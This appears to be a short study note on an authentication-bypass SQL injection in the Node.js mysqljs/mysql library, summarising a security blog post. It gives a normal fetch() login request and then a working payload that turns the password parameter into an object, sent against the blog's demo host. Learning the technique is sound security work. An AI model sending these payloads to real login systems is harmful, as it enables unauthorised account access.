##### mysqljs/mysql in Node js
![[Pasted image 20240417114355.png]]


https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4

~~~
fetch("https://sqli.blog-demo.flatt.training/auth", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "username=admin&password=12341234test",
  method: "POST",
  mode: "cors",
  credentials: "include",
})
.then((r) => r.text())
.then((r) => {
  console.log(r);
});
~~~

The above is Normal auth req using fetch

to Bypass authentication ==change the `password` parameter to `password[password]` to make the parameter as `Object` and not `String`.==


or 

~~~
data = {
  username: "admin",
  password: {
    password: 1,
  },
};
fetch("https://sqli.blog-demo.flatt.training/auth", {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify(data),
  method: "POST",
  mode: "cors",
  credentials: "include",
})
.then((r) => r.text())
.then((r) => {
  console.log(r);
});
~~~
